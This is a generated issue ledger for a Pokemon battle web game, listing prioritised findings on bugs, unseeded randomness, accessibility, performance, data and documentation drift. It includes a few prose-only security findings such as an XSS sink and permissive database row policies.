# Issue Ledger — Pokemon Battle Arena

> **Generated**: 2026-05-28T18:13:43.468Z
> **Source**: `agent-state/findings/*.md` (203 unique findings after dedup)
> **Regenerate**: `node scripts/debug/issue-ledger.mjs`
> **Schema**: see `agent-state/LEDGER_SCHEMA.md`

This file is **regenerated**, not hand-edited. To add an issue, drop a
finding file into `agent-state/findings/` and re-run the ledger. To update
status, edit the corresponding finding file and re-run.

## Summary

| Severity | Count |
|---|---|
| P0 | 2 |
| P1 | 42 |
| P2 | 70 |
| P3 | 89 |
| **Total** | **203** |

| Category | Count |
|---|---|
| a11y | 25 |
| balance | 9 |
| bug | 47 |
| data | 10 |
| dx | 28 |
| inconsistency | 48 |
| perf | 22 |
| refactor | 9 |
| security | 4 |
| test-gap | 1 |

## TOC

- [ISSUE-001] [P0] `applyBattleLogHtml` injects raw `battle_log_html` from the room row into the DOM — XSS sink fed by world-writable Supabase row — `applyBattleLogHtml` (security)
- [ISSUE-002] [P0] Permissive RLS (`using (true)` for UPDATE/DELETE/INSERT) lets any anon client clobber/wipe any PvP room — `pvp_rooms_update` (security)
- [ISSUE-003] [P1] Player gimmick gate reads bare IIFE-private `sm` — always sees zero unlocked gimmicks — `_withStoryPlayerGimmickGate` (inconsistency)
- [ISSUE-004] [P1] aiDecision early-returns null on any choiceLock — AI cannot switch out of an immune/walled lock — `aiDecision` (bug)
- [ISSUE-005] [P1] Difficulty tiers scale only enemy stats; AI policy is byte-identical at every tier — no rising *challenge*, just a rising stat-wall — `applyFoeDifficultyScaling` (balance)
- [ISSUE-006] [P1] Sleep duration roll uses bare `Math.random()` (RNG drift on every sleep proc) — `applyStatus` (bug)
- [ISSUE-007] [P1] League foe stat boost stacks multiplicatively despite comment claiming additive merge — `applyStoryLeagueFoeStatBoost` (bug)
- [ISSUE-008] [P1] Black Market shop from STORY_FEATURES_INTEGRATION.md §3 is still entirely unimplemented — `BLACK_MARKET_ITEMS` (inconsistency)
- [ISSUE-009] [P1] `canMove` paralysis + confusion self-hit checks use bare `Math.random()` (RNG drift in story replays) — `canMove` (bug)
- [ISSUE-010] [P1] Sleep wake-check is off-by-one — ~1/3 of sleeps cost 0 turns (instant wake, mon acts same turn) — `canMove` (bug)
- [ISSUE-011] [P1] `canMove` paralysis fizzle uses bare `Math.random()` while sibling freeze thaw uses `storyRngNext` — `canMove` (bug)
- [ISSUE-012] [P1] Ball inventory + `catchMode` flag in STORY_FEATURES_INTEGRATION §1/§2/§5 do not match shipped code — `catchMode` (inconsistency)
- [ISSUE-013] [P1] The unique Master Ball can be wasted on any wild — soft-locks the Caged God capture (only 1% catch rate without it) — `catchThrow` (bug)
- [ISSUE-014] [P1] Unique Master Ball can be wasted on any non-boss wild (Crucible wild encounter), soft-locking the Caged God capture — VERIFIED still present post-merge — `catchThrow` (bug)
- [ISSUE-015] [P1] proceedToNextBattle re-entry stacks duplicate cold-open overlays, wedging progression (the "After Badge One" stuck state) — `enterBattleEvent` (bug)
- [ISSUE-016] [P1] Retune risk: `data/builds/gen*.json` is a fallback mirror, not the live build source (`data/builds.csv` is authoritative) — `fetchSmogonSetsForGen` (data)
- [ISSUE-017] [P1] Choice-locked AI re-returns the locked move with zero immunity/wall check — spams 0-dmg moves forever — `getBestMove` (bug)
- [ISSUE-018] [P1] AI spams setup move into an active phazer — `score *= 0.25` penalty loses to near-zero attack scores — `getBestMove` (bug)
- [ISSUE-019] [P1] Illegal Dealer NPC encounter (STORY_FEATURES_INTEGRATION.md §3.5) still missing — `illegalDealer` (inconsistency)
- [ISSUE-020] [P1] Full Itinerary scaffolding (STORY_FEATURES_INTEGRATION.md §10) still entirely unimplemented — `itineraryProgress` (inconsistency)
- [ISSUE-021] [P1] `lastRemoteSeq` is updated *before* the remote handler runs — a thrown handler still bumps the watermark, so the failed update is permanently skipped — `lastRemoteSeq` (bug)
- [ISSUE-022] [P1] Save-migration integration test never exercises the migrate chain (vacuous pass) — `migrateStoryPreV15` (dx)
- [ISSUE-023] [P1] v14 trainer-assignment migration is bundled under `_loadedVer < 13`, so v13 saves skip it — `migrateStoryTrainerAssignmentsPreV14` (bug)
- [ISSUE-024] [P1] Secondary flinch/Stench write `defender.volatile.flinch` unguarded — throws if volatile missing (sibling _tryConfuse guards it) — `parseMoveEffects` (bug)
- [ISSUE-025] [P1] Many `parseMoveEffects` branches still use bare `Math.random()` — seeded story replays drift — `parseMoveEffects` (bug)
- [ISSUE-026] [P1] Core damage roll, crit, and accuracy use bare `Math.random()` — the highest-impact drift sites — `parseMoveEffects-damage-core` (bug)
- [ISSUE-027] [P1] Eight contact-triggered defender ability procs (Static / Poison Point / Flame Body / Cute Charm / Effect Spore / Toxic Chain / Cursed Body / Poison Touch) all use bare `Math.random()` — `parseMoveEffects-on-contact-abilities` (bug)
- [ISSUE-028] [P1] Contact-ability procs (Static / Poison Point / Flame Body / Cute Charm / Poison Touch / Toxic Chain / Cursed Body) all bare `Math.random()` — `parseMoveEffects-onhit-abilities` (bug)
- [ISSUE-029] [P1] PC_BOX_CAP is 30 in code but the canonical spec says 10 — `PC_BOX_CAP` (inconsistency)
- [ISSUE-030] [P1] Battle for Pokémon wager system (STORY_FEATURES_INTEGRATION.md §6) still missing — `pendingWager` (inconsistency)
- [ISSUE-031] [P1] Turn-order priority breakers (Quick Claw, speed-tie, rampage duration) use bare `Math.random()` — `playTurn` (bug)
- [ISSUE-032] [P1] End-of-turn residual block is not try-wrapped — any throw masks as "Turn skipped" + skips residuals — `playTurn` (bug)
- [ISSUE-033] [P1] `pushData` queue keeps advancing after a write fails — `_pushDataImpl` errors are swallowed to `console.warn`, leaving local state diverged from Supabase — `pushDataQueue` (bug)
- [ISSUE-034] [P1] `pvp_rooms` SELECT policy is `using (true)` — anyone with the public key can scrape every live match's full draft + battle state — `pvp_rooms_select` (security)
- [ISSUE-035] [P1] `remoteRowQueue` has no timeout — a hung `onOnlineRoomData` (e.g., a UI promise that never resolves) freezes ALL future remote updates — `remoteRowQueue` (bug)
- [ISSUE-036] [P1] Player-facing city actions read "Pokemon League" / "Pokemon Fan Club" (no diacritic) — `renderCityActions` (inconsistency)
- [ISSUE-037] [P1] Draft pick cards are click-only <div>s — keyboard/SR users cannot select a Pokémon — `renderDraft` (a11y)
- [ISSUE-038] [P1] `No Item` sentinel string used in 11 build slots is absent from `data/items.json` — `resolveCsvBuildEntry` (data)
- [ISSUE-039] [P1] showScreen() does no focus management on story-screen transitions — focus is orphaned — `showScreen` (a11y)
- [ISSUE-040] [P1] Mechanics-unlock docs still describe one-per-gym drip; code now unlocks all four at Colress/City 6 — `slotsUnlocked` (inconsistency)
- [ISSUE-041] [P1] Reaper's Toll uses bare IIFE-private `storyRngNext` — guard always false, breaks seeded replays — `storyRngNext` (inconsistency)
- [ISSUE-042] [P1] Pokémon Trader (STORY_FEATURES_INTEGRATION.md §7) at City4 still missing — `traderOfferByCity` (inconsistency)
- [ISSUE-043] [P1] Speed-tie resolution + Quick Claw + lock-turn duration all use bare `Math.random()` in the turn loop — `turn-resolution` (bug)
- [ISSUE-044] [P1] `???` type used by gen1 `bide` and gen4 `curse` is not defined in `typeChart` — `typeChart` (data)
- [ISSUE-045] [P2] 7 duplicated `select('data').eq('id', roomId).single()` fetch+error blocks in online-pvp.js — `_hostRunResolution` (refactor)
- [ISSUE-046] [P2] Build "illegal-ability" pairs (672) are intended (hackmons/AAA + mega-form abilities); a naive legality check false-positives — `_isBuildAbilityIllegal` (inconsistency)
- [ISSUE-047] [P2] Cable Link gimmick gate contradicts CHANGELOG promise that Cable Link surfaces pre-unlock mechanics — `_makePlayerLinkBuild` (inconsistency)
- [ISSUE-048] [P2] Story autosave "💾 Saved" toast bypasses the polite live region — screen readers miss it — `_maybeShowSaveToast` (a11y)
- [ISSUE-049] [P2] "PC nearly full" warning threshold is `PC_BOX_CAP - 3` (27/30) but the spec calls for 80% (8/10) — `_pcRefresh` (inconsistency)
- [ISSUE-050] [P2] Rivalry tab is mis-homed in the Pokémon Center — belongs in a progression/journal surface — `_pcRenderRivalJournalTab` (refactor)
- [ISSUE-051] [P2] Battle Frontier hub displays stale, weaker foe-scaling numbers than what applyStoryLeagueFoeStatBoost actually applies — `_renderFrontierHub` (inconsistency)
- [ISSUE-052] [P2] Story tutorial overlay (STORY_TUTORIAL_SCENES) is not a dialog — no role, focus trap, or ESC — `_showStoryTutorialScene` (a11y)
- [ISSUE-053] [P2] Current enemy curve is lumpy, not rising — GL4=GL5 dead zone (foe mult 1.0) and a GL8 quad-cliff (T3->T4 + IV 18->26 + gimmicks 2->3) — `_stageGatedFoeStatMult` (inconsistency)
- [ISSUE-054] [P2] Foe party size matches `team.length` with per-role floors instead of the spec'd `min(6, 2+badges)` badge curve — `_storyEnemyPartySize` (balance)
- [ISSUE-055] [P2] rollTrainerTeam's evo-stage cap uses cityIndexFromEventIndex on a ROW ID (not array index) — intro Rival gets cap 2 (fully evolved) instead of 0 (basics-only) — `_storyEvoStageCapForRow` (bug)
- [ISSUE-056] [P2] Planned hatch animation + Fight Club transitions need reduced-motion + live-region design up front — `_storyHatchRevealScene` (a11y)
- [ISSUE-057] [P2] `_storyPickMysteryIdentity` uses bare `Math.random()` — Mystery Figure roll diverges across seeded replays — `_storyPickMysteryIdentity` (bug)
- [ISSUE-058] [P2] CSV-load cache invalidation pokes IIFE-private `_txMetaCache`/`_txGlobalMetaCached` — invalidation is dead — `_txMetaCache` (inconsistency)
- [ISSUE-059] [P2] applyStatus dereferences `state.pActive.volatile.lockMove` / `state.fActive.volatile.lockMove` unconditionally (Uproar check) — throws if an active is null — `applyStatus` (bug)
- [ISSUE-060] [P2] Memory growth is benign (linear, ~25 KB/turn, R² = 0.712 — noise-dominated) and **does not indicate a leak**; the mandate's "60 turn / quadratic = P1" threshold is not hit — `benchMemoryGrowth` (perf)
- [ISSUE-061] [P2] `perf-bench.mjs` calls `parseMoveEffects(move)` with the wrong arg-count; the reported 1.4 ms "median" is the cost of a thrown `TypeError`, not real per-move parsing — `benchParseMove` (perf)
- [ISSUE-062] [P2] Turn-loop max latency is **78–84 ms** with IQR 12 ms — within the harness target (50 ms median is OK) but max is 5× the median, indicating a per-turn outlier path — `benchTurn` (perf)
- [ISSUE-063] [P2] catch-system integration test asserts a stale "PC cap of 10" and passes on an incidental substring — same hollow-test pattern as safari-zone — `catch-system.test` (dx)
- [ISSUE-064] [P2] `sm.catchUnlocked` is written 3× but never read; spec §10 says it gates wild-route prompts — `catchUnlocked` (inconsistency)
- [ISSUE-065] [P2] autopilot-player classify() treats a cold-open as a city — pump fires city actions instead of dismissing the overlay, masking/causing the stuck-on-"After Badge One" report — `classify` (dx)
- [ISSUE-066] [P2] `deepClone` falls back to `JSON.parse(JSON.stringify(...))` — silently drops Set/Map/Date/undefined/circular refs across the entire snapshot pipeline — `deepClone` (refactor)
- [ISSUE-067] [P2] Design checklist's load-bearing "CSS block = battle.html lines 16-4156" guardrail is wrong by ~3700 lines — `DESIGN_CONSISTENCY_CHECKLIST.md` (dx)
- [ISSUE-068] [P2] Malva (Kalos E1) has a victory line but no intro pool in `TRAINER_QUOTES_BY_NAME` — `ELITE_VICTORY_LINES` (inconsistency)
- [ISSUE-069] [P2] PLAN COLLISION — Daycare unlock is keyed on the "Gym Leader 1" event name, not a city; redesign wants C2/C4/C6 — `enterDaycare` (refactor)
- [ISSUE-070] [P2] Validator reports 6925 "CSV alternative" occurrences but every build file uses arrays — false positive — `expandCommaAlternatives` (dx)
- [ISSUE-071] [P2] No sleep clause in story + AI scores Spore at 100 → up to 3-turn lock loops, amplified by high-tier stat bloat (fairness risk) — `getBestMove` (balance)
- [ISSUE-072] [P2] When every damaging move is immune (score 0), AI throws a 0-dmg attack instead of switching/using status — `getBestMove` (inconsistency)
- [ISSUE-073] [P2] 36 references to 18 distinct `global.__*` variables across `online-pvp.js` — the PvP module mutates host-side state through ad-hoc globals instead of a single observable — `global_state_coupling` (refactor)
- [ISSUE-074] [P2] City-3 display name always falls back to "City 3" — GYM_CITY_LEADER_EVENT returns an array index, but trainerAssignments is keyed by row ID — `GYM_CITY_LEADER_EVENT` (bug)
- [ISSUE-075] [P2] `_loadedVer < 14` block missing — v14 trainer-name migration never runs for saves stamped at exactly v13 — `load` (bug)
- [ISSUE-076] [P2] Migration chain is sound but unobservable — no boot-time shadow validation — `load` (dx)
- [ISSUE-077] [P2] Pre-merge saves with partial unlockedGimmicks are not re-derived on load — Tera/Z silently withheld until next milestone win — `load` (bug)
- [ISSUE-078] [P2] 6 builds in the gen*.json mirror omit `nature`; the CSV source has natures for all 17,398 rows (mirror drift) — `loadBuildsCSV` (inconsistency)
- [ISSUE-079] [P2] Engine-only `loadGameData` parse is ~308 ms (isolated from JSDOM), >1.5× the 200 ms boot target and scales with every new data table — `loadGameData` (perf)
- [ISSUE-080] [P2] `logMsg` runs an O(903-keys) `Object.keys(tooltipDict)` scan on every log line — 0.32 ms median, 13.9 ms max per call — `logMsg` (perf)
- [ISSUE-081] [P2] Pre-v15 post-HoF saves are forced back through the Mystery Figure climax — postHofMysteryClimaxDone migration shadowed by default boolean — `migrateStoryPreV15` (bug)
- [ISSUE-082] [P2] 10 of 12 `.modal` overlays lack `role="dialog"` / `aria-modal` / labelledby — `modal-dialog-roles` (a11y)
- [ISSUE-083] [P2] Only `modal-summary` handles Escape — settings, abandon, alert, confirm modals trap keyboard users — `modal-escape-key` (a11y)
- [ISSUE-084] [P2] Modals restore focus on close but never move focus INTO the dialog on open — `openModal` (a11y)
- [ISSUE-085] [P2] In-game help text still says "PC Storage (cap 10)" — actual PC_BOX_CAP is 30 — `PC_BOX_CAP` (inconsistency)
- [ISSUE-086] [P2] Nurse Joy first-Center tutorial says PC has "ten slots" but PC_BOX_CAP is 30 — `playStoryTutorial` (inconsistency)
- [ISSUE-087] [P2] Turn-loop median **23–38 ms / p95 35–53 ms / max 46–58 ms** in jsdom — production with `settings.animations=true` adds bounded `sleep()` delays on top, but the jsdom number IS the production floor when animations are off — `playTurn` (perf)
- [ISSUE-088] [P2] 29 of 31 mart/dept catalog items (potion, superPotion, X items, orbs, etc.) have no entry in `data/items.json` — `POKEMART_ITEMS` (data)
- [ISSUE-089] [P2] Mart/Dept consumables (30 ids: potion, xAttack, sunOrb, evResetCharm…) are a self-contained namespace, NOT entries in items.json — `POKEMART_ITEMS` (data)
- [ISSUE-090] [P2] README calls catch / PC / Underground / Safari / boss-arc "upcoming"; all are shipped — `README` (inconsistency)
- [ISSUE-091] [P2] City-hub Mystery Figure NPC sprite is hard-coded to Cyrus, ignoring `sm.mysteryIdentity` rotation — `renderCityActions` (bug)
- [ISSUE-092] [P2] Pokémon Center copy promises a "Heal" that no longer exists (full-heal is automatic) — `renderCityActions` (bug)
- [ISSUE-093] [P2] `_trainerPoolCache` is an unbounded Map (keyed on type+gens) with no eviction — Fight Club draft / story-pool variety will grow it without limit — `rollTrainerTeam` (perf)
- [ISSUE-094] [P2] Safari unlock spec'd "after badge 3 OR City3" but code (and REDESIGN) fix it firmly at City4 — `SAFARI_ENTRY_COST` (inconsistency)
- [ISSUE-095] [P2] safari-zone integration test gives false confidence — asserts stale hard-coded weights and matches "1.25" anywhere in the spec doc — `safari-zone.test` (dx)
- [ISSUE-096] [P2] STORY_MODE_FLOW pins SAVE_VER at 15/17; shipped SAVE_VER is 21 — `SAVE_VER` (inconsistency)
- [ISSUE-097] [P2] SAVE_VER stays at 19 despite an implicit v20 schema cleanup that runs on every load — `SAVE_VER` (dx)
- [ISSUE-098] [P2] 6 silent `catch (e) {}` blocks in online-pvp.js swallow all errors without logging — `setBattleLogHtml` (dx)
- [ISSUE-099] [P2] Display names accepted up to 24 chars with zero sanitization — flow into innerText today, but one careless innerHTML downstream becomes XSS — `setDisplayName` (security)
- [ISSUE-100] [P2] settings.animations defaults to true and is never seeded from prefers-reduced-motion — `settings-animations-init` (a11y)
- [ISSUE-101] [P2] anime.js move-FX engine ignores prefers-reduced-motion — heaviest motion bypasses the CSS catch-all — `showMoveEffect` (a11y)
- [ISSUE-102] [P2] Victory overlay is a plain `<div>` — no dialog role, no focus on Continue, ESC ignored — `showVictoryOverlay` (a11y)
- [ISSUE-103] [P2] STORY_MODE_FLOW says timeline is "68 rows"; STORY_EVENTS_RAW actually has 67 rows — `STORY_EVENTS_RAW` (inconsistency)
- [ISSUE-104] [P2] Story spine is a hardcoded linear array; narrative layer is data-driven but no structural side-story/random-pool slots — `STORY_EVENTS_RAW` (refactor)
- [ISSUE-105] [P2] Recurring facility-flavor pool covers 8 services; Safari / Stone Sage / Stone Shop / Dept Store have none — `STORY_FACILITY_QUOTES` (inconsistency)
- [ISSUE-106] [P2] De-scoped features (Black Market, Illegal Dealer, Trader, Wager, full Itinerary) still presented as active spec — precise doc-edit list — `STORY_FEATURES_INTEGRATION` (dx)
- [ISSUE-107] [P2] Story tone variants recolor nameplate text but not its yellow background — fails WCAG AA contrast — `story-dialog-nameplate` (a11y)
- [ISSUE-108] [P2] Story dialogue/NPC quote text is not in a live region — narration is silent to screen readers — `story-dialog-text` (a11y)
- [ISSUE-109] [P2] Cosmetic-skin roll references bare `sm` AND bare `storyRngNext` — double scope leak, never seeded — `storyRngNext` (inconsistency)
- [ISSUE-110] [P2] 351 it.todo() stubs across 3 move-category test files — cluster enumeration — `tests/moves/by-category` (test-gap)
- [ISSUE-111] [P2] 56 Gym Leaders have no entry in `TRAINER_QUOTES_BY_NAME` — fall through to generic 6-line `Gym Leader` pool — `TRAINER_QUOTES_BY_NAME` (inconsistency)
- [ISSUE-112] [P2] Tooltip-only data (type chart, move info, status terms) is `onmousemove`-gated — keyboard & touch get nothing — `type-badge` (a11y)
- [ISSUE-113] [P2] Long story replay shows steady, non-plateauing heap growth (~22–67 KB/turn, R²=0.99 over 250 battles) driven by per-turn / per-distinct-foe DOM scaffolding that GC + reset() do not reclaim — `updateBattleUI` (perf)
- [ISSUE-114] [P2] Long story replay shows linear (non-quadratic) heap + DOM-node growth that does not plateau — ~0.275 MB and ~52 sprite-container nodes retained per battle — `updateBattleUI` (perf)
- [ISSUE-115] [P3] Modals have aria-modal + Escape but no Tab focus trap — keyboard focus can leave the dialog — `__pbsGlobalEscBound` (a11y)
- [ISSUE-116] [P3] CONFIRMED CLEAN — PC overflow at party-cap + 30/30 shows explicit message; sell/release path exists — `_catchHandleSuccess` (bug)
- [ISSUE-117] [P3] Eggs occupy a party slot against the catch/withdraw cap but foe size matches only non-egg fighters — eggs silently shrink your catchable roster AND your opponent — `_catchHandleSuccess` (inconsistency)
- [ISSUE-118] [P3] `_pickCityQuoteLine` deliberately uses bare `Math.random` — drift across save reloads — `_pickCityQuoteLine` (inconsistency)
- [ISSUE-119] [P3] Sprite preloading is unbounded — each `getSprite()` call adds a `new Image()` to a global cache with no eviction; a long story run can preload 1000+ images — `_preloadedImages` (perf)
- [ISSUE-120] [P3] Safari curve key [3] ("first unlock") is dead code — Safari actually unlocks at 4 badges, so first visit uses the harsher [4] curve — `_SAFARI_GRADE_CURVE_BY_BADGES` (inconsistency)
- [ISSUE-121] [P3] Safari grade weights are now badge-keyed — spec/CODEBASE_MAP still cite the old static g1:3/g2:22/g3:50/g4:25 — `_safariGradeWeightsForBadges` (inconsistency)
- [ISSUE-122] [P3] CONFIRMED CLEAN — catch tutorial fires exactly once; mid-tutorial reload cannot refire or lock — `_shouldFireCatchTutorialBeforeBattle` (bug)
- [ISSUE-123] [P3] Basic Trainer build-tier ladder collapses at Stage 2 — same tier as Gym Trainers despite the "one tier below" comment — `_storyBuildTierForEvent` (balance)
- [ISSUE-124] [P3] `_storyEnemyMechKeys` doesn't guard against missing `sm.settings` — could throw on a malformed save — `_storyEnemyMechKeys` (dx)
- [ISSUE-125] [P3] CONFIRMED CLEAN — party-cap curve = min(6, 2+badges) with no off-by-one; foe sizing matches — `_storyMaxPartySize` (bug)
- [ISSUE-126] [P3] Variant rival quote pools are uneven — several phases have a single line; many phases absent — `_VARIANT_RIVAL_QUOTES` (refactor)
- [ISSUE-127] [P3] CONFIRMED CLEAN — mechanics unlock gate has no leak on any player or enemy path — `_withStoryPlayerGimmickGate` (bug)
- [ISSUE-128] [P3] `applyFoeDifficultyScaling`'s "additive league boost" comment narrates a fix that was never implemented — `applyFoeDifficultyScaling` (dx)
- [ISSUE-129] [P3] Spec §8 says league boost stacks MULTIPLICATIVELY with difficulty; code now stacks ADDITIVELY — `applyStoryLeagueFoeStatBoost` (inconsistency)
- [ISSUE-130] [P3] `sm.catchUnlocked` is written by migration + newStoryRun but never read anywhere — `catchUnlocked` (dx)
- [ISSUE-131] [P3] CHAMPION_VICTORY_LINES['Hau'] is dead — Hau is an Elite Trainer, never a Champion — `CHAMPION_VICTORY_LINES` (inconsistency)
- [ISSUE-132] [P3] CHANGELOG 2026-05-21 entry claims Cable Link is ungated but the implementation in v18 explicitly gates it — `CHANGELOG` (inconsistency)
- [ISSUE-133] [P3] `createRoom` hardcodes Postgres SQLSTATE `23505` for unique-violation detection — defensive `.includes('duplicate')` fallback exists but the magic number is undocumented — `createRoom_23505` (refactor)
- [ISSUE-134] [P3] ELITE_VICTORY_LINES['Molayne'] is dead — Molayne is an Elite Trainer, not an E1–E4 boss — `ELITE_VICTORY_LINES` (inconsistency)
- [ISSUE-135] [P3] Relic Annex intro uses plain-text `_storyShowOneTimeTip`; every other facility uses a sprite-backed scene — `enterArtifactShop` (inconsistency)
- [ISSUE-136] [P3] `enterProfessor` duplicates gimmick-gate logic inline instead of using `_withStoryPlayerGimmickGate` — `enterProfessor` (dx)
- [ISSUE-137] [P3] `enterProfessor` reuses `_pendingProfChoices` across city visits at the same cityIdx — stale picks may persist past spec'd one-shot pool — `enterProfessor` (bug)
- [ISSUE-138] [P3] Service-availability timeline reference (Task 1 deliverable) — first-appearance / reappear / unlock map — `FACILITY_DEBUT_CITY` (data)
- [ISSUE-139] [P3] Gauntlet score readout is a plain div with no live region — score changes are silent to SR — `gauntlet-score` (a11y)
- [ISSUE-140] [P3] Paralysis tooltip says "Speed quartered" but engine halves speed (0.5) — stale Gen 1-6 text vs Gen 7+ behavior — `getDownStatusLabel` (inconsistency)
- [ISSUE-141] [P3] Sprite preload cache `_preloadedImages` is still an unbounded Object with no eviction — every distinct (name, shiny, back) pins an Image() for the session — `getSprite` (perf)
- [ISSUE-142] [P3] CONFIRMED FIXED — GYM_CITY_LEADER_EVENT is now derived from STORY_EVENTS_RAW at boot (prior audit 1.3) — `GYM_CITY_LEADER_EVENT` (bug)
- [ISSUE-143] [P3] `isPokeball` flag set on 28 items but never read by the engine — dead metadata — `isPokeball` (data)
- [ISSUE-144] [P3] 9 legacy gen2 berries (Bitter, Burnt, Gold, Ice, Mint, Miracle, Mystery, PRZ Cure, PSN Cure) have no engine handler — `items.json` (data)
- [ISSUE-145] [P3] `delete sm.casinoCoins` cleanup runs on every load, not gated by `_loadedVer` — `load` (bug)
- [ISSUE-146] [P3] CONFIRMED CLEAN — full migrate chain v8→v21 round-trips pre-v15 saves without crash or party/PC/badge loss — `load` (bug)
- [ISSUE-147] [P3] Engine cold-boot is 2.88 s in jsdom — within the harness target (5 s) but **14× the mandate's 200 ms target** — `loadEngine` (perf)
- [ISSUE-148] [P3] Test-harness docs promise window.SAVE_VER / window.sm / window.newStoryRun but only StoryMode + __storyLoad are exposed — `loadEngine` (dx)
- [ISSUE-149] [P3] `console.log` cluster in battle.html — debug noise in shipped code — `loadGameData` (dx)
- [ISSUE-150] [P3] Cold boot is ~3.0 s in jsdom (5-process median 3009 ms) — within the harness's relaxed 5 s self-target but 15× the mandate's 200 ms; a target-mismatch to resolve, not a regression — `loadGameData` (perf)
- [ISSUE-151] [P3] `makeBuild` is flat across power tiers (T1-T4 spread <0.04 ms median) — confirms no per-tier pathology; baseline 0.045 ms median — `makeBuild` (perf)
- [ISSUE-152] [P3] v15 stable-ID migration only iterates `sm.team`, not `sm.pcBox` (harmless today but inconsistent with v17) — `migrateStoryPreV15` (dx)
- [ISSUE-153] [P3] Pre-v15 saves get 0 Poké Balls instead of the intended 5 — migrateStoryPreV15 balls default is shadowed by the default sm object — `migrateStoryPreV15` (bug)
- [ISSUE-154] [P3] Online Host/Join form labels are not programmatically associated with their inputs — `modal-online-host` (a11y)
- [ISSUE-155] [P3] CONFIRMED FIXED — Mystery Figure is now a rotating 10-identity cast (prior audit: hardcoded Cyrus) — `MYSTERY_FIGURE_IDENTITIES` (inconsistency)
- [ISSUE-156] [P3] A cluster of form controls lack accessible names (online host/join, casino bet, gauntlet opt-in) — `online-host-format` (a11y)
- [ISSUE-157] [P3] `parseCSV` of `data/builds.csv` (2.6 MB, 17,397 rows) blocks the main thread for **180 ms median** during boot — `parseCSV` (perf)
- [ISSUE-158] [P3] `parseMoveEffects` per-move latency varies by ~315× between fastest and slowest moves; outliers are 25–250× the median — `parseMoveEffects` (perf)
- [ISSUE-159] [P3] `parseMoveEffects` per-move latency varies ~257× (median 0.012 ms, slowest 3.19 ms) — multi-stat-boost / "dance" moves are the outliers — `parseMoveEffects` (perf)
- [ISSUE-160] [P3] `parseMoveEffects` re-allocates 19 constant `Set` literals on every call and pays a 2–14 ms one-time JIT cost on first touch of each branch (warm cost is fine at ~0.01 ms) — `parseMoveEffects` (perf)
- [ISSUE-161] [P3] Burn applied as final-damage multiplier (`modifier *= 0.5`) instead of halving the attack stat pre-floor — `parseMoveEffects-burn-modifier` (inconsistency)
- [ISSUE-162] [P3] Stat-change status moves (Decorate, Coaching, Baby-Doll Eyes, Calm Mind) are 50–100× slower than damage moves — `changeStage` calls `logMsg` 1–3× per stat tick, each hitting the 903-key tooltipDict scan — `parseMoveEffects-changeStage-tooltipScan` (perf)
- [ISSUE-163] [P3] Hand-quantification of parseMoveEffects Set-literal churn — 18 `new Set([...])` per call, 13 μs of pure allocation per call (≈70% of warm 18 μs median) — `parseMoveEffects-sets-warm` (perf)
- [ISSUE-164] [P3] 129 `@keyframes` definitions but only 5 `prefers-reduced-motion` overrides — sprite-in, dialog-in, master-pulse, badge-pulse all unguarded — `prefers-reduced-motion` (a11y)
- [ISSUE-165] [P3] proceedToNextBattle guards on total team length, but the launch path guards on non-egg fighter count — an all-egg party advances eventIndex then bounces — `proceedToNextBattle` (bug)
- [ISSUE-166] [P3] proceedToNextBattle "no Pokémon" guard counts eggs (team.length) while the fight launch counts only fighters — egg-only party advances then bounces — `proceedToNextBattle` (inconsistency)
- [ISSUE-167] [P3] Room codes use `Math.random()` over 32 chars × 6 positions — 30 bits, birthday collision at ~30K concurrent rooms, retry-on-23505 saves correctness but not enumeration cost — `randomCode` (bug)
- [ISSUE-168] [P3] README calls shipped catch / PC / Underground / Safari / boss-arc systems "upcoming" — `README.md` (dx)
- [ISSUE-169] [P3] Nature Rater availability is gappy (C0, C3, C5–C9) — absent C1/C2/C4 with no unlock rationale — `renderCityActions` (balance)
- [ISSUE-170] [P3] Party count chip shows "(N/6)" regardless of the actual badge-driven cap — `renderTeamPanel` (bug)
- [ISSUE-171] [P3] CONFIRMED FIXED — RIVAL_ATTACK_TYPE_DECAY is now 10 (prior audit 1.2 had ÷30 too-aggressive) — `RIVAL_ATTACK_TYPE_DECAY` (balance)
- [ISSUE-172] [P3] Mystery Figure intro pool fallback uses 2 lines but the identity's `intros` field has 4 — falls back silently if the identity object lacks `intros` — `rollMysteryFigureFinalBossTeam` (bug)
- [ISSUE-173] [P3] Mystery Figure climax boss has ZERO gimmicks if the player disabled all 4 mechanics at run start — the "force all on" ctx is dead-coded — `rollMysteryFigureFinalBossTeam` (inconsistency)
- [ISSUE-174] [P3] `rollTrainerTeam` cold-call is **1.63 ms median (max 3.22 ms)**; well under the 50 ms target but worth recording as the deep-dive baseline before the upcoming difficulty-curve work — `rollTrainerTeam` (perf)
- [ISSUE-175] [P3] All 24 `#screen-*` containers are plain `<div>` — no `<main>` or `role="region"` — `screen-landmarks` (a11y)
- [ISSUE-176] [P3] Several story-mode dev seeds use `Math.random` for build / sprite picks, breaking seeded replays when debug seeds are in play — `seedDebugMysteryLegendGate` (bug)
- [ISSUE-177] [P3] End-of-turn residual logic is duplicated verbatim in forced-switch path and main loop — divergence risk — `selectPartyMember` (inconsistency)
- [ISSUE-178] [P3] Player gimmick-unlock order shifts when a mechanic is disabled in settings — DMax unlocks at Gym 5 instead of Gym 6 if Mega is off — `settings.megaOn` (dx)
- [ISSUE-179] [P3] `shouldForceCityProfessor` uses dead `sm.team.length < 6` floor that's shadowed by outer `hasTeamRoom` gate — `shouldForceCityProfessor` (refactor)
- [ISSUE-180] [P3] `shouldForceCityProfessor`'s `sm.team.length < 6` floor is dead-coded once the outer `hasTeamRoom` gate clamps to `_storyMaxPartySize()` — `shouldForceCityProfessor` (dx)
- [ISSUE-181] [P3] Stale comment claims rival secondary intro "Uses Math.random" — it now uses seeded _storySideRng — `showBattleIntro` (inconsistency)
- [ISSUE-182] [P3] Mobile move-details "i" is a span[role=button] with no tabindex/keydown — keyboard cannot reach it — `showMoves` (a11y)
- [ISSUE-183] [P3] Mystery Figure identity is rolled at run start before sm.active/runSeed are live — not reproducible under fixed debug seeds — `startNewRun` (bug)
- [ISSUE-184] [P3] Internal action keys use `Pokemon` (no diacritic) while UI labels use `Pokémon` — `STORY_EVENTS_RAW` (inconsistency)
- [ISSUE-185] [P3] Doc line anchors stale — 18/50 `battle.html:LINE` refs in design docs no longer resolve (clustered) — `STORY_EVENTS_RAW` (dx)
- [ISSUE-186] [P3] Service-timeline pacing — City1 post-gym hub is a dead zone (no new "thing to do") — `STORY_EVENTS_RAW` (balance)
- [ISSUE-187] [P3] STORY_EVENTS_RAW has 67 array rows (incl. 2 'Hall of Fame' string matches) — mandate/spec cite "68 rows" — `STORY_EVENTS_RAW` (data)
